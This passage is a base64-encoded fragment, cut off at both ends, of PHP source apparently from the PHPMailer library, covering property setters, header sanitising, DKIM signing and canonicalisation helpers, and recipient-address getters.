4dGVuc2lvbic6DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2V4dGVuc2lvbiddOw0KICAgICAgICAgICAgY2FzZSBQQVRISU5GT19GSUxFTkFNRToNCiAgICAgICAgICAgIGNhc2UgJ2ZpbGVuYW1lJzoNCiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnZmlsZW5hbWUnXTsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXQ7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBTZXQgb3IgcmVzZXQgaW5zdGFuY2UgcHJvcGVydGllcy4NCiAgICAgKiBZb3Ugc2hvdWxkIGF2b2lkIHRoaXMgZnVuY3Rpb24gLSBpdCdzIG1vcmUgdmVyYm9zZSwgbGVzcyBlZmZpY2llbnQsIG1vcmUgZXJyb3ItcHJvbmUgYW5kDQogICAgICogaGFyZGVyIHRvIGRlYnVnIHRoYW4gc2V0dGluZyBwcm9wZXJ0aWVzIGRpcmVjdGx5Lg0KICAgICAqIFVzYWdlIEV4YW1wbGU6DQogICAgICogYCRtYWlsLT5zZXQoJ1NNVFBTZWN1cmUnLCAndGxzJyk7YA0KICAgICAqICAgaXMgdGhlIHNhbWUgYXM6DQogICAgICogYCRtYWlsLT5TTVRQU2VjdXJlID0gJ3Rscyc7YA0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBUaGUgcHJvcGVydHkgbmFtZSB0byBzZXQNCiAgICAgKiBAcGFyYW0gbWl4ZWQgJHZhbHVlIFRoZSB2YWx1ZSB0byBzZXQgdGhlIHByb3BlcnR5IHRvDQogICAgICogQHJldHVybiBib29sZWFuDQogICAgICogQFRPRE8gU2hvdWxkIHRoaXMgbm90IGJlIHVzaW5nIHRoZSBfX3NldCgpIG1hZ2ljIGZ1bmN0aW9uPw0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXQoJG5hbWUsICR2YWx1ZSA9ICcnKQ0KICAgIHsNCiAgICAgICAgaWYgKHByb3BlcnR5X2V4aXN0cygkdGhpcywgJG5hbWUpKSB7DQogICAgICAgICAgICAkdGhpcy0+JG5hbWUgPSAkdmFsdWU7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygndmFyaWFibGVfc2V0JykgLiAkbmFtZSk7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBTdHJpcCBuZXdsaW5lcyB0byBwcmV2ZW50IGhlYWRlciBpbmplY3Rpb24uDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHINCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZWN1cmVIZWFkZXIoJHN0cikNCiAgICB7DQogICAgICAgIHJldHVybiB0cmltKHN0cl9yZXBsYWNlKGFycmF5KCINCiIsICINCiIpLCAnJywgJHN0cikpOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIE5vcm1hbGl6ZSBsaW5lIGJyZWFrcyBpbiBhIHN0cmluZy4NCiAgICAgKiBDb252ZXJ0cyBVTklYIExGLCBNYWMgQ1IgYW5kIFdpbmRvd3MgQ1JMRiBsaW5lIGJyZWFrcyBpbnRvIGEgc2luZ2xlIGxpbmUgYnJlYWsgZm9ybWF0Lg0KICAgICAqIERlZmF1bHRzIHRvIENSTEYgKGZvciBtZXNzYWdlIGJvZGllcykgYW5kIHByZXNlcnZlcyBjb25zZWN1dGl2ZSBicmVha3MuDQogICAgICogQHBhcmFtIHN0cmluZyAkdGV4dA0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGJyZWFrdHlwZSBXaGF0IGtpbmQgb2YgbGluZSBicmVhayB0byB1c2UsIGRlZmF1bHRzIHRvIENSTEYNCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHN0YXRpYw0KICAgICAqLw0KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gbm9ybWFsaXplQnJlYWtzKCR0ZXh0LCAkYnJlYWt0eXBlID0gIg0KIikNCiAgICB7DQogICAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy8oDQp8DQp8DQopL21zJywgJGJyZWFrdHlwZSwgJHRleHQpOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFNldCB0aGUgcHVibGljIGFuZCBwcml2YXRlIGtleSBmaWxlcyBhbmQgcGFzc3dvcmQgZm9yIFMvTUlNRSBzaWduaW5nLg0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHBhcmFtIHN0cmluZyAkY2VydF9maWxlbmFtZQ0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGtleV9maWxlbmFtZQ0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGtleV9wYXNzIFBhc3N3b3JkIGZvciBwcml2YXRlIGtleQ0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGV4dHJhY2VydHNfZmlsZW5hbWUgT3B0aW9uYWwgcGF0aCB0byBjaGFpbiBjZXJ0aWZpY2F0ZQ0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBzaWduKCRjZXJ0X2ZpbGVuYW1lLCAka2V5X2ZpbGVuYW1lLCAka2V5X3Bhc3MsICRleHRyYWNlcnRzX2ZpbGVuYW1lID0gJycpDQogICAgew0KICAgICAgICAkdGhpcy0+c2lnbl9jZXJ0X2ZpbGUgPSAkY2VydF9maWxlbmFtZTsNCiAgICAgICAgJHRoaXMtPnNpZ25fa2V5X2ZpbGUgPSAka2V5X2ZpbGVuYW1lOw0KICAgICAgICAkdGhpcy0+c2lnbl9rZXlfcGFzcyA9ICRrZXlfcGFzczsNCiAgICAgICAgJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlID0gJGV4dHJhY2VydHNfZmlsZW5hbWU7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogUXVvdGVkLVByaW50YWJsZS1lbmNvZGUgYSBES0lNIGhlYWRlci4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHR4dA0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fUVAoJHR4dCkNCiAgICB7DQogICAgICAgICRsaW5lID0gJyc7DQogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8IHN0cmxlbigkdHh0KTsgJGkrKykgew0KICAgICAgICAgICAgJG9yZCA9IG9yZCgkdHh0WyRpXSk7DQogICAgICAgICAgICBpZiAoKCgweDIxIDw9ICRvcmQpICYmICgkb3JkIDw9IDB4M0EpKSB8fCAkb3JkID09IDB4M0MgfHwgKCgweDNFIDw9ICRvcmQpICYmICgkb3JkIDw9IDB4N0UpKSkgew0KICAgICAgICAgICAgICAgICRsaW5lIC49ICR0eHRbJGldOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkbGluZSAuPSAnPScgLiBzcHJpbnRmKCclMDJYJywgJG9yZCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRsaW5lOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEdlbmVyYXRlIGEgREtJTSBzaWduYXR1cmUuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzaWduSGVhZGVyDQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24NCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgREtJTSBzaWduYXR1cmUgdmFsdWUNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9TaWduKCRzaWduSGVhZGVyKQ0KICAgIHsNCiAgICAgICAgaWYgKCFkZWZpbmVkKCdQS0NTN19URVhUJykpIHsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4dGVuc2lvbl9taXNzaW5nJykgLiAnb3BlbnNzbCcpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuICcnOw0KICAgICAgICB9DQogICAgICAgICRwcml2S2V5U3RyID0gIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nKSA/ICR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nIDogZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPkRLSU1fcHJpdmF0ZSk7DQogICAgICAgIGlmICgnJyAhPSAkdGhpcy0+REtJTV9wYXNzcGhyYXNlKSB7DQogICAgICAgICAgICAkcHJpdktleSA9IG9wZW5zc2xfcGtleV9nZXRfcHJpdmF0ZSgkcHJpdktleVN0ciwgJHRoaXMtPkRLSU1fcGFzc3BocmFzZSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkcHJpdktleSA9IG9wZW5zc2xfcGtleV9nZXRfcHJpdmF0ZSgkcHJpdktleVN0cik7DQogICAgICAgIH0NCiAgICAgICAgLy9Xb3JrYXJvdW5kIGZvciBtaXNzaW5nIGRpZ2VzdCBhbGdvcml0aG1zIGluIG9sZCBQSFAgJiBPcGVuU1NMIHZlcnNpb25zDQogICAgICAgIC8vQGxpbmsgaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL2EvMTExMTczMzgvMzMzMzQwDQogICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjMuMCcpID49IDAgYW5kDQogICAgICAgICAgICBpbl9hcnJheSgnc2hhMjU2V2l0aFJTQUVuY3J5cHRpb24nLCBvcGVuc3NsX2dldF9tZF9tZXRob2RzKHRydWUpKSkgew0KICAgICAgICAgICAgaWYgKG9wZW5zc2xfc2lnbigkc2lnbkhlYWRlciwgJHNpZ25hdHVyZSwgJHByaXZLZXksICdzaGEyNTZXaXRoUlNBRW5jcnlwdGlvbicpKSB7DQogICAgICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOw0KICAgICAgICAgICAgICAgIHJldHVybiBiYXNlNjRfZW5jb2RlKCRzaWduYXR1cmUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHBpbmZvID0gb3BlbnNzbF9wa2V5X2dldF9kZXRhaWxzKCRwcml2S2V5KTsNCiAgICAgICAgICAgICRoYXNoID0gaGFzaCgnc2hhMjU2JywgJHNpZ25IZWFkZXIpOw0KICAgICAgICAgICAgLy8nTWFnaWMnIGNvbnN0YW50IGZvciBTSEEyNTYgZnJvbSBSRkMzNDQ3DQogICAgICAgICAgICAvL0BsaW5rIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmMzNDQ3I3BhZ2UtNDMNCiAgICAgICAgICAgICR0ID0gJzMwMzEzMDBkMDYwOTYwODY0ODAxNjUwMzA0MDIwMTA1MDAwNDIwJyAuICRoYXNoOw0KICAgICAgICAgICAgJHBzbGVuID0gJHBpbmZvWydiaXRzJ10gLyA4IC0gKHN0cmxlbigkdCkgLyAyICsgMyk7DQogICAgICAgICAgICAkZWIgPSBwYWNrKCdIKicsICcwMDAxJyAuIHN0cl9yZXBlYXQoJ0ZGJywgJHBzbGVuKSAuICcwMCcgLiAkdCk7DQoNCiAgICAgICAgICAgIGlmIChvcGVuc3NsX3ByaXZhdGVfZW5jcnlwdCgkZWIsICRzaWduYXR1cmUsICRwcml2S2V5LCBPUEVOU1NMX05PX1BBRERJTkcpKSB7DQogICAgICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOw0KICAgICAgICAgICAgICAgIHJldHVybiBiYXNlNjRfZW5jb2RlKCRzaWduYXR1cmUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIG9wZW5zc2xfcGtleV9mcmVlKCRwcml2S2V5KTsNCiAgICAgICAgcmV0dXJuICcnOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEdlbmVyYXRlIGEgREtJTSBjYW5vbmljYWxpemF0aW9uIGhlYWRlci4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHNpZ25IZWFkZXIgSGVhZGVyDQogICAgICogQHJldHVybiBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9IZWFkZXJDKCRzaWduSGVhZGVyKQ0KICAgIHsNCiAgICAgICAgJHNpZ25IZWFkZXIgPSBwcmVnX3JlcGxhY2UoJy8NClxzKy8nLCAnICcsICRzaWduSGVhZGVyKTsNCiAgICAgICAgJGxpbmVzID0gZXhwbG9kZSgiDQoiLCAkc2lnbkhlYWRlcik7DQogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAka2V5ID0+ICRsaW5lKSB7DQogICAgICAgICAgICBsaXN0KCRoZWFkaW5nLCAkdmFsdWUpID0gZXhwbG9kZSgnOicsICRsaW5lLCAyKTsNCiAgICAgICAgICAgICRoZWFkaW5nID0gc3RydG9sb3dlcigkaGVhZGluZyk7DQogICAgICAgICAgICAkdmFsdWUgPSBwcmVnX3JlcGxhY2UoJy9cc3syLH0vJywgJyAnLCAkdmFsdWUpOyAvLyBDb21wcmVzcyB1c2VsZXNzIHNwYWNlcw0KICAgICAgICAgICAgJGxpbmVzWyRrZXldID0gJGhlYWRpbmcgLiAnOicgLiB0cmltKCR2YWx1ZSk7IC8vIERvbid0IGZvcmdldCB0byByZW1vdmUgV1NQIGFyb3VuZCB0aGUgdmFsdWUNCiAgICAgICAgfQ0KICAgICAgICAkc2lnbkhlYWRlciA9IGltcGxvZGUoIg0KIiwgJGxpbmVzKTsNCiAgICAgICAgcmV0dXJuICRzaWduSGVhZGVyOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEdlbmVyYXRlIGEgREtJTSBjYW5vbmljYWxpemF0aW9uIGJvZHkuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IE1lc3NhZ2UgQm9keQ0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fQm9keUMoJGJvZHkpDQogICAgew0KICAgICAgICBpZiAoJGJvZHkgPT0gJycpIHsNCiAgICAgICAgICAgIHJldHVybiAiDQoiOw0KICAgICAgICB9DQogICAgICAgIC8vIHN0YWJpbGl6ZSBsaW5lIGVuZGluZ3MNCiAgICAgICAgJGJvZHkgPSBzdHJfcmVwbGFjZSgiDQoiLCAiDQoiLCAkYm9keSk7DQogICAgICAgICRib2R5ID0gc3RyX3JlcGxhY2UoIg0KIiwgIg0KIiwgJGJvZHkpOw0KICAgICAgICAvLyBFTkQgc3RhYmlsaXplIGxpbmUgZW5kaW5ncw0KICAgICAgICB3aGlsZSAoc3Vic3RyKCRib2R5LCBzdHJsZW4oJGJvZHkpIC0gNCwgNCkgPT0gIg0KDQoiKSB7DQogICAgICAgICAgICAkYm9keSA9IHN1YnN0cigkYm9keSwgMCwgc3RybGVuKCRib2R5KSAtIDIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkYm9keTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDcmVhdGUgdGhlIERLSU0gaGVhZGVyIGFuZCBib2R5IGluIGEgbmV3IG1lc3NhZ2UgaGVhZGVyLg0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyc19saW5lIEhlYWRlciBsaW5lcw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN1YmplY3QgU3ViamVjdA0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgQm9keQ0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fQWRkKCRoZWFkZXJzX2xpbmUsICRzdWJqZWN0LCAkYm9keSkNCiAgICB7DQogICAgICAgICRES0lNc2lnbmF0dXJlVHlwZSA9ICdyc2Etc2hhMjU2JzsgLy8gU2lnbmF0dXJlICYgaGFzaCBhbGdvcml0aG1zDQogICAgICAgICRES0lNY2Fub25pY2FsaXphdGlvbiA9ICdyZWxheGVkL3NpbXBsZSc7IC8vIENhbm9uaWNhbGl6YXRpb24gb2YgaGVhZGVyL2JvZHkNCiAgICAgICAgJERLSU1xdWVyeSA9ICdkbnMvdHh0JzsgLy8gUXVlcnkgbWV0aG9kDQogICAgICAgICRES0lNdGltZSA9IHRpbWUoKTsgLy8gU2lnbmF0dXJlIFRpbWVzdGFtcCA9IHNlY29uZHMgc2luY2UgMDA6MDA6MDAgLSBKYW4gMSwgMTk3MCAoVVRDIHRpbWUgem9uZSkNCiAgICAgICAgJHN1YmplY3RfaGVhZGVyID0gIlN1YmplY3Q6ICRzdWJqZWN0IjsNCiAgICAgICAgJGhlYWRlcnMgPSBleHBsb2RlKCR0aGlzLT5MRSwgJGhlYWRlcnNfbGluZSk7DQogICAgICAgICRmcm9tX2hlYWRlciA9ICcnOw0KICAgICAgICAkdG9faGVhZGVyID0gJyc7DQogICAgICAgICRkYXRlX2hlYWRlciA9ICcnOw0KICAgICAgICAkY3VycmVudCA9ICcnOw0KICAgICAgICBmb3JlYWNoICgkaGVhZGVycyBhcyAkaGVhZGVyKSB7DQogICAgICAgICAgICBpZiAoc3RycG9zKCRoZWFkZXIsICdGcm9tOicpID09PSAwKSB7DQogICAgICAgICAgICAgICAgJGZyb21faGVhZGVyID0gJGhlYWRlcjsNCiAgICAgICAgICAgICAgICAkY3VycmVudCA9ICdmcm9tX2hlYWRlcic7DQogICAgICAgICAgICB9IGVsc2VpZiAoc3RycG9zKCRoZWFkZXIsICdUbzonKSA9PT0gMCkgew0KICAgICAgICAgICAgICAgICR0b19oZWFkZXIgPSAkaGVhZGVyOw0KICAgICAgICAgICAgICAgICRjdXJyZW50ID0gJ3RvX2hlYWRlcic7DQogICAgICAgICAgICB9IGVsc2VpZiAoc3RycG9zKCRoZWFkZXIsICdEYXRlOicpID09PSAwKSB7DQogICAgICAgICAgICAgICAgJGRhdGVfaGVhZGVyID0gJGhlYWRlcjsNCiAgICAgICAgICAgICAgICAkY3VycmVudCA9ICdkYXRlX2hlYWRlcic7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJCRjdXJyZW50KSAmJiBzdHJwb3MoJGhlYWRlciwgJyA9PycpID09PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICQkY3VycmVudCAuPSAkaGVhZGVyOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRjdXJyZW50ID0gJyc7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRmcm9tID0gc3RyX3JlcGxhY2UoJ3wnLCAnPTdDJywgJHRoaXMtPkRLSU1fUVAoJGZyb21faGVhZGVyKSk7DQogICAgICAgICR0byA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCR0b19oZWFkZXIpKTsNCiAgICAgICAgJGRhdGUgPSBzdHJfcmVwbGFjZSgnfCcsICc9N0MnLCAkdGhpcy0+REtJTV9RUCgkZGF0ZV9oZWFkZXIpKTsNCiAgICAgICAgJHN1YmplY3QgPSBzdHJfcmVwbGFjZSgNCiAgICAgICAgICAgICd8JywNCiAgICAgICAgICAgICc9N0MnLA0KICAgICAgICAgICAgJHRoaXMtPkRLSU1fUVAoJHN1YmplY3RfaGVhZGVyKQ0KICAgICAgICApOyAvLyBDb3BpZWQgaGVhZGVyIGZpZWxkcyAoZGtpbS1xdW90ZWQtcHJpbnRhYmxlKQ0KICAgICAgICAkYm9keSA9ICR0aGlzLT5ES0lNX0JvZHlDKCRib2R5KTsNCiAgICAgICAgJERLSU1sZW4gPSBzdHJsZW4oJGJvZHkpOyAvLyBMZW5ndGggb2YgYm9keQ0KICAgICAgICAkREtJTWI2NCA9IGJhc2U2NF9lbmNvZGUocGFjaygnSConLCBoYXNoKCdzaGEyNTYnLCAkYm9keSkpKTsgLy8gQmFzZTY0IG9mIHBhY2tlZCBiaW5hcnkgU0hBLTI1NiBoYXNoIG9mIGJvZHkNCiAgICAgICAgaWYgKCcnID09ICR0aGlzLT5ES0lNX2lkZW50aXR5KSB7DQogICAgICAgICAgICAkaWRlbnQgPSAnJzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRpZGVudCA9ICcgaT0nIC4gJHRoaXMtPkRLSU1faWRlbnRpdHkgLiAnOyc7DQogICAgICAgIH0NCiAgICAgICAgJGRraW1oZHJzID0gJ0RLSU0tU2lnbmF0dXJlOiB2PTE7IGE9JyAuDQogICAgICAgICAgICAkREtJTXNpZ25hdHVyZVR5cGUgLiAnOyBxPScgLg0KICAgICAgICAgICAgJERLSU1xdWVyeSAuICc7IGw9JyAuDQogICAgICAgICAgICAkREtJTWxlbiAuICc7IHM9JyAuDQogICAgICAgICAgICAkdGhpcy0+REtJTV9zZWxlY3RvciAuDQogICAgICAgICAgICAiOw0KIiAuDQogICAgICAgICAgICAiCXQ9IiAuICRES0lNdGltZSAuICc7IGM9JyAuICRES0lNY2Fub25pY2FsaXphdGlvbiAuICI7DQoiIC4NCiAgICAgICAgICAgICIJaD1Gcm9tOlRvOkRhdGU6U3ViamVjdDsNCiIgLg0KICAgICAgICAgICAgIglkPSIgLiAkdGhpcy0+REtJTV9kb21haW4gLiAnOycgLiAkaWRlbnQgLiAiDQoiIC4NCiAgICAgICAgICAgICIJej0kZnJvbQ0KIiAuDQogICAgICAgICAgICAiCXwkdG8NCiIgLg0KICAgICAgICAgICAgIgl8JGRhdGUNCiIgLg0KICAgICAgICAgICAgIgl8JHN1YmplY3Q7DQoiIC4NCiAgICAgICAgICAgICIJYmg9IiAuICRES0lNYjY0IC4gIjsNCiIgLg0KICAgICAgICAgICAgIgliPSI7DQogICAgICAgICR0b1NpZ24gPSAkdGhpcy0+REtJTV9IZWFkZXJDKA0KICAgICAgICAgICAgJGZyb21faGVhZGVyIC4gIg0KIiAuDQogICAgICAgICAgICAkdG9faGVhZGVyIC4gIg0KIiAuDQogICAgICAgICAgICAkZGF0ZV9oZWFkZXIgLiAiDQoiIC4NCiAgICAgICAgICAgICRzdWJqZWN0X2hlYWRlciAuICINCiIgLg0KICAgICAgICAgICAgJGRraW1oZHJzDQogICAgICAgICk7DQogICAgICAgICRzaWduZWQgPSAkdGhpcy0+REtJTV9TaWduKCR0b1NpZ24pOw0KICAgICAgICByZXR1cm4gJGRraW1oZHJzIC4gJHNpZ25lZCAuICINCiI7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogRGV0ZWN0IGlmIGEgc3RyaW5nIGNvbnRhaW5zIGEgbGluZSBsb25nZXIgdGhhbiB0aGUgbWF4aW11bSBsaW5lIGxlbmd0aCBhbGxvd2VkLg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cg0KICAgICAqIEByZXR1cm4gYm9vbGVhbg0KICAgICAqIEBzdGF0aWMNCiAgICAgKi8NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGhhc0xpbmVMb25nZXJUaGFuTWF4KCRzdHIpDQogICAgew0KICAgICAgICAvLysyIHRvIGluY2x1ZGUgQ1JMRiBsaW5lIGJyZWFrIGZvciBhIDEwMDAgdG90YWwNCiAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goJy9eKC57Jy4oc2VsZjo6TUFYX0xJTkVfTEVOR1RIICsgMikuJyx9KS9tJywgJHN0cik7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ3RvJyBwcm9wZXJ0eS4NCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcmV0dXJuIGFycmF5DQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGdldFRvQWRkcmVzc2VzKCkNCiAgICB7DQogICAgICAgIHJldHVybiAkdGhpcy0+dG87DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ2NjJyBwcm9wZXJ0eS4NCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcmV0dXJuIGFycmF5DQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGdldENjQWRkcmVzc2VzKCkNCiAgICB7DQogICAgICAgIHJldHVybiAkdGhpcy0+Y2M7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ2JjYycgcHJvcGVydHkuDQogICAgICogQG5vdGU6IEJlZm9yZSB0aGUgc2VuZCgpIGNhbGwsIHF1ZXVlZCBhZGRyZXNzZXMgKGkuZS4gd2l0aCBJRE4pIGFyZSBub3QgeWV0IGluY2x1ZGVkLg0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHJldHVybiBhcnJheQ0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRCY2NBZGRyZXNzZXMoKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5iY2M7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ1JlcGx5VG8nIHByb3BlcnR5Lg0KICAgICAqIEBub3RlOiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEByZXR1cm4gYXJyYXkNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0UmVwbHlUb0FkZHJlc3NlcygpDQogICAgew0KICAgICAgICByZXR1cm4gJHRoaXMtPlJlcGx5VG87DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ2FsbF9yZWNpcGllbnRzJyBwcm9wZXJ0eS4NCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcmV0dXJuIGFycmF5DQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGdldEFsbFJlY2lwaWVudEFkZHJlc3NlcygpDQogICAgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmFsbF9yZWNpcGllbnRzOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFBlcmZvcm0gYSBjYWxsYmFjay4NCiAgICAgKiBAcGFyYW0gYm9vbGVhbiAkaXNTZW50DQogICAgICogQHBhcmFtIGFycmF5ICR0bw0KICAgICAqIEBwYXJhbSBhcnJheSAkY2MNCiAgICAgKiBAcGFyYW0gYXJyYXkgJGJjYw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN1YmplY3QNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5DQogICAgICogQHBhcmFtIHN0cmluZyAkZnJvbQ0KICAgICAqLw0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBkb0NhbGxiYWNrKCRpc1NlbnQsICR0bywgJGNjLCAkYmNjLCAkc3ViamVjdCwgJGJvZHksICRmcm9tKQ0KICAgIHsNCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uKSAmJiBpc19jYWxsYWJsZSgkdGhpcy0+YWN0aW9uX2Z1bmN0aW9uKSkgew0KICAgICAgICAgICAgJHBhcmFtcyA9IGFycmF5KCRpc1NlbnQsICR0bywgJGNjLCAkYmNjLCAkc3ViamVjdCwgJGJvZHksICRmcm9tKTsNCiAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jX2FycmF5KCR0aGlzLT5hY3Rpb25fZnVuY3Rpb24sICRwYXJhbXMpOw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQovKioNCiAqIFBIUE1haWxlciBleGNlcHRpb24gaGFuZGxlcg0KICogQHBhY2thZ2UgUEhQTWFpbGVyDQogKi8NCmNsYXNzIHBocG1haWxlckV4Y2VwdGlvbiBleHRlbmR